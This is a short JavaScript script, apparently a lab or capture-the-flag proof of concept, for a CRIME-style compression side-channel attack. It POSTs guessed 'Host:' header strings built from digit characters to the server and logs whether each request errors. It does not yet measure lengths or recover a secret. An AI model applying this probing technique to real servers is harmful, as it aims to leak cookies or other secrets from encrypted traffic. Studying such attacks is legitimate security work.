var payload = "cookie: "
function sendCRIME(payload) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = sendRequestHandler;
    // xhr.withCredentials = true;
    xhr.open("POST", "/");
    xhr.send(payload);
}

function sendRequestHandler() {
    if (this.readyState == this.DONE) {
        if (this.status == 0) {
            console.log("HMAC ERROR")
        } else {
            console.log("OK")
        }
    }
}

for (let index = 48; index < 58; index++) {
    console.log(index)
}

function go() {
    var i;
    for (i = 48; i < 58; i++) { 
        console.log("Host: 0" + String.fromCharCode(i));
        sendCRIME("Host: 0" + String.fromCharCode(i))
    }
}

sendCRIME("Host: 0")
sendCRIME("Host: 1")
sendCRIME("Host: 2")
sendCRIME("Host: 3")
sendCRIME("Host: 4")
sendCRIME("Host: 5")

sendCRIME("Host: 12")
sendCRIME("Host: 19")

sendCRIME("Host: 123")
sendCRIME("Host: 192")

sendCRIME("Host: 392")
